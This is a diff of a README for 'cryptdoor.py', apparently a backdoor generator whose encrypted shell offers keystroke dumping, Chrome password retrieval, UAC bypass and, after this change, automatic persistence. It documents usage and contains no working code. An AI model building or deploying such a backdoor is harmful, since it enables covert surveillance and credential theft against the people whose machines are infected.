@@ -14,11 +14,13 @@ Usage
 cryptdoor.py will make the backdoor and server.
 The syntax is:
 
-	./cryptdoor.py host port (backdoorname) (servername)
+	./cryptdoor.py host port
+
+You can add a -p to attempt automatic persistence like:
+
+	./cryptdoor.py host port -p
 
 host and port refer to the host and port of the listening server.
-If you don't include backdoorname and servername, files will be named backdoor.py and server.py.
-
 
 	AES-shell options:
     	 download file       -  Download a file from remote pwd to localhost.
@@ -32,7 +34,6 @@ If you don't include backdoorname and servername, files will be named backdoor.p
     	 keydump             -  Dump recorded keystrokes.
     	 keyclear            -  Clear the keystroke buffer.
     	 chromepass          -  Retrieve chrome stored passwords.
-    	 screenshot          -  Take a screenshot.
     	 bypassuac cmds      -  Run commands as admin.
 
 
